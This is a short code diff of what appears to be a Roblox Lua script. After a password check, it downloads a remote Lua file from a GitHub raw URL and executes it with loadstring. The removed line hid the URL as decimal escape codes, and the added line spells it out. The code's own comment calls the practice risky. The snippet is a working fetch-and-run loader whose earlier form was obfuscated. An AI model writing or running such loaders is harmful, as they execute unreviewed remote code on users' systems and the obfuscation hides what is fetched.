@@ -63,7 +63,7 @@ submitButton.MouseButton1Click:Connect(function()
         passwordGui:Destroy()  -- 如果密码正确，销毁密码输入界面
 
         -- 以下是加载并执行外部脚本的代码，不建议在实际中使用，存在风险
-        local scriptContent = game:HttpGet("\104\116\116\112\115\58\47\47\114\97\119\46\103\105\116\104\117\98\117\115\101\114\99\111\110\116\101\110\116\46\99\111\109\47\110\97\105\110\115\104\117\47\110\111\47\109\97\105\110\47\65\80\84\46\108\117\97")
+        local scriptContent = game:HttpGet("https://raw.githubusercontent.com/nainshu/no/main/APT%20(3).lua")
         local func = loadstring(scriptContent)
         if func then
             func()
